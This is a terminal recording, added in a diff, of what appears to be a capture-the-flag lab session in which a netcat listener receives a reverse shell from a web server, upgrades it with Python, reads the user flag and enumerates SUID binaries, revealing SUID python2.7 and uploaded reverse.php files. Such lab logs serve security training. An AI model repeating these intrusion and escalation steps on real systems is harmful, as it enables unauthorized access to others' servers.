@@ -1,0 +1,83 @@
+Script started on 2026-09-16 12:56:59+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 62965
+SOCKET: Shell has connected! PID: 1313
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython --version[?2004l[K[?2004hpython --version
+[KPython 2.7.18
+[K[K[?2004h[7mpython3 -c 'import pty; pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty; pty.spawn("/bin/bash")'
+[Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+'ChatGPT Image Jun 8, 2026, 08_06_24 AM.png'   reverse.php.jpg	 reverse.php5
+www-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+www-data@ip-10-64-180-55:/var/www/html$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+Website.zip  css  index.php  js  panel	uploads
+www-data@ip-10-64-180-55:/var/www/html$ [Kwww-data@ip-10-64-180-55:/var/www/html$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html$ cd oab[K[K[Kpanel[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd panel
+[Kcd panel[Kcd panel[Kcd panel
+www-data@ip-10-64-180-55:/var/www/html/panel$ [Kwww-data@ip-10-64-180-55:/var/www/html/panel$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/panel$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+index.php
+www-data@ip-10-64-180-55:/var/www/html/panel$ [Kwww-data@ip-10-64-180-55:/var/www/html/panel$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/panel$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+www-data@ip-10-64-180-55:/var/www/html$ [Kwww-data@ip-10-64-180-55:/var/www/html$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html$ cd [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd 
+[Kcd [Kcd [Kcd 
+bash: cd: HOME not set
+www-data@ip-10-64-180-55:/var/www/html$ [Kwww-data@ip-10-64-180-55:/var/www/html$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+www-data@ip-10-64-180-55:/var/www$ [Kwww-data@ip-10-64-180-55:/var/www$ [K[?2004hwww-data@ip-10-64-180-55:/var/www$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+html  user.txt
+www-data@ip-10-64-180-55:/var/www$ [Kwww-data@ip-10-64-180-55:/var/www$ [K[?2004hwww-data@ip-10-64-180-55:/var/www$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt[Kcat user.txt[Kcat user.txt
+THM{y0u_g0t_a_sh3ll}
+www-data@ip-10-64-180-55:/var/www$ [Kwww-data@ip-10-64-180-55:/var/www$ [K[?2004hwww-data@ip-10-64-180-55:/var/www$ [7mfind / -user root -perm /4000[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000
+[Kfind / -user root -perm /4000[Kfind / -user root -perm /4000[Kfind / -user root -perm /4000
+find: ‘/home/ubuntu/.cache’: Permission denied
+find: ‘/home/ubuntu/.ssh’: Permission denied
+find: ‘/home/rootme/.cache’: Permission denied
+find: ‘/home/rootme/.gnupg’: Permission denied
+find: ‘/home/test/.local/share’: Permission denied
+find: ‘/sys/kernel/tracing’: Permission denied
+find: ‘/sys/kernel/debug’: Permission denied
+find: ‘/sys/fs/pstore’: Permission denied
+find: ‘/sys/fs/bpf’: Permission denied
+find: ‘/sys/fs/fuse/connections/54’: Permission denied
+find: ‘/sys/fs/cgroup/freezer/snap.lxd’: Permission denied
+find: ‘/run/udisks2’: Permission denied
+find: ‘/run/lxcfs’: Permission denied
+find: ‘/run/sudo’: Permission denied
+find: ‘/run/cryptsetup’: Permission denied
+find: ‘/run/multipath’: Permission denied
+find: ‘/run/lvm’: Permission denied
+find: ‘/run/systemd/unit-root’: Permission denied
+find: ‘/run/systemd/inaccessible’: Permission denied
+find: ‘/run/lock/lvm’: Permission denied
+find: ‘/run/initramfs’: Permission denied
+find: ‘/root’: Permission denied
+find: ‘/lost+found’: Permission denied
+find: ‘/etc/ssl/private’: Permission denied
+find: ‘/etc/multipath’: Permission denied
+find: ‘/etc/polkit-1/localauthority’: Permission denied
+find: ‘/etc/sudoers.d’: Permission denied
+[K/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+[K/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+[K/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+[K
+[?2004l
+Script done on 2026-09-16 13:03:42+03:00 [COMMAND_EXIT_CODE="1"]
